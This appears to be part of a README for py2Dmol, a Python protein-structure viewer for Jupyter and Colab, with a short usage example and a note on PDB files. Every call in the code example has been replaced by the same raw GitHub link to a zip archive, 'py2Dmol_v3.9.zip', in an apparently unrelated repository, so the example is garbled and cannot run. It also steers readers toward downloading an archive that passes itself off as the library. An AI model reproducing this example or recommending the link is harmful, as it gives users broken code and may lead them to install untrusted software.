- Python version 3.6 or newer
- Jupyter Notebook or Google Colab for testing the library

## 🔄 Basic Usage

To get started with py2Dmol, open your Jupyter Notebook or Google Colab. Then, you can use the following example to visualize a protein structure from a PDB file.

### Example: Loading a PDB File

Follow these steps in your Python environment:

```python
import py2Dmol

# 1. Create a viewer object
viewer = https://raw.githubusercontent.com/miaomiao-aowu/py2Dmol/main/web/py2Dmol_v3.9.zip(size=(600, 600))

# 2. Add pdb file
https://raw.githubusercontent.com/miaomiao-aowu/py2Dmol/main/web/py2Dmol_v3.9.zip('https://raw.githubusercontent.com/miaomiao-aowu/py2Dmol/main/web/py2Dmol_v3.9.zip', chains=['A', 'B'])

# 3. Show the final, static view
https://raw.githubusercontent.com/miaomiao-aowu/py2Dmol/main/web/py2Dmol_v3.9.zip()
```

### 🗂️ About PDB Files

PDB (Protein Data Bank) files contain information about the 3D structures of proteins and other biological molecules. In this example, you add a PDB file to the viewer, which allows you to visualize the structure easily.
